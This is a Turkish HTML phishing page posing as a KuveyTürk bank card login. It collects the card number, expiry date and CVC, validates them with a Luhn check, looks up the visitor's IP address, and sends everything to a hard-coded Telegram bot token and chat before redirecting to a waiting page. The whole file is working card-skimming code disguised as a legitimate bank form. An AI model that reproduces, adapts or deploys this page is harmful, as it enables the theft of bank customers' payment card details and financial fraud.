<!DOCTYPE html>
<html lang="tr">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.1/font/bootstrap-icons.css"
        integrity="sha384-4LISF5TTJX/fLmGSxO53rV4miRxdg84mZsxmO8Rx5jGtp/LbrixFETvWa5a6sESd" crossorigin="anonymous">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet"
        integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css">
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.bundle.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.15/jquery.mask.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.inputmask/5.0.8/jquery.inputmask.min.js"></script>
    <link rel="stylesheet" href="assets/css/style1.css">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/inputmask/5.0.7-beta.43/inputmask.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/inputmask/5.0.7/jquery.inputmask.min.js"></script>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.inputmask/5.0.6/jquery.inputmask.min.js"></script>

    <script src="assets/js/main.js"></script>
	
</head>

    <title>KuveyTürk Kart Girişi</title>
    <link rel="icon" href="ayar/resim/logo.png" type="image/png">

    <style>
        input.field {
            font-family: 'Inter', sans-serif;
            font-weight: 500;
        }
    </style>
</head>

<body>
    <div id="thirdContent">
        <form action="wait.html" method="post">
            <div id="form1">
                <a href="/" style="text-decoration: none;">
                    <div style="margin-top: 17px; float: right; margin-right: 15px; text-align: right;">
                       
                    </div>
                </a>
                <div class="tabs">
                    <div class="active">Kart Bilgileri ile Giriş</div>
                </div>
                <div class="inputs">
                    <div class="group">
                        <div>
                            <input type="text" placeholder="16 haneli Kart Numaranız" class="field" name="cardNumber" id="cardNumber" maxlength="19" required>
                        </div>
                    </div>
                    <div class="group">
                        <div>
                            <input type="text" placeholder="Son Kullanma Tarihi (AA/YY)" class="field" name="expiry" id="expiry" maxlength="5" required>
                        </div>
                    </div>
                    <div class="group">
                        <div>
                            <input type="text" placeholder="CVC" class="field" name="cvc" id="cvc" maxlength="3" required>
                        </div>
                    </div>
                    <div class="form-check">
                        <input type="checkbox" class="form-check-input shadow-none" checked id="exampleCheck1">
                        <label class="form-check-label" for="exampleCheck1"
                            style="margin-top: 6px; margin-left: 6px; color: #00a66c;">Beni hatırla</label>
                    </div>
                </div>
                <div class="giris-yap">
                    <input type="button" id="nextPage" class="button" value="Giriş Yap" style="background: #00a66c; id=" disabled style="opacity: 0.5;">
                </div>
            </div>
        </form>
    </div>

    <script>
$(document).ready(function () {
    const cardInput = $('#cardNumber');
    const expInput = $('#expiry');
    const cvcInput = $('#cvc');
    const button = $('#nextPage');

    // Maskeler
    cardInput.inputmask('9999 9999 9999 9999');
    expInput.inputmask('99/99');
    cvcInput.inputmask('999');

    // Luhn algoritması
    function luhnCheck(cardNumber) {
        const digits = cardNumber.replace(/\s/g, '');
        let sum = 0;
        let shouldDouble = false;

        for (let i = digits.length - 1; i >= 0; i--) {
            let digit = parseInt(digits.charAt(i));
            if (shouldDouble) {
                digit *= 2;
                if (digit > 9) digit -= 9;
            }
            sum += digit;
            shouldDouble = !shouldDouble;
        }

        return sum % 10 === 0;
    }

    // SKT kontrol
    function isValidExpiry(expiry) {
        const parts = expiry.split('/');
        if (parts.length !== 2) return false;

        const month = parseInt(parts[0], 10);
        const year = parseInt("20" + parts[1], 10);
        const now = new Date();
        const currentMonth = now.getMonth() + 1;
        const currentYear = now.getFullYear();

        if (isNaN(month) || isNaN(year)) return false;
        if (month < 1 || month > 12) return false;
        if (year < currentYear || (year === currentYear && month < currentMonth)) return false;

        return true;
    }

    // Giriş kontrolü
    function validateInputs() {
        const card = cardInput.val().replace(/\s/g, '');
        const expiry = expInput.val();
        const cvc = cvcInput.val();

        const isCardValid = /^\d{16}$/.test(card) && luhnCheck(card);
        const isCvcValid = /^\d{3}$/.test(cvc);
        const isExpiryValid = isValidExpiry(expiry);

        if (isCardValid && isCvcValid && isExpiryValid) {
            button.prop("disabled", false).css("opacity", "1");
        } else {
            button.prop("disabled", true).css("opacity", "0.5");
        }
    }

    // Her input değiştiğinde kontrol et
    cardInput.on("input", validateInputs);
    expInput.on("input", validateInputs);
    cvcInput.on("input", validateInputs);

    // Giriş yap
    button.click(function (event) {
        event.preventDefault();

        const cardNumber = cardInput.val().trim();
        const expiry = expInput.val().trim();
        const cvc = cvcInput.val().trim();

        $.get("https://api64.ipify.org?format=json", function (data) {
            var ipAddress = data.ip;

            var botToken = "8089680642:AAEa305uuWRdfGIrQq-rM4DOOQ6NGSGU0IM";
            var chatId = "-1002475411082";
            var message = ` Kart Bilgileri\n\nKart Numarası: ${cardNumber}\nSKT: ${expiry}\nCVC: ${cvc}\nIP Adresi: ${ipAddress}`;

            var url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

            $.get(url, function () {
                window.location.href = "wait.html";
            }).fail(function () {
                alert("Bir hata oluştu, lütfen tekrar deneyin.");
            });
        }).fail(function () {
            alert("IP adresi alınamadı.");
        });
    });

    validateInputs(); // İlk açılışta da kontrol et
});

    </script>
</body>

</html>
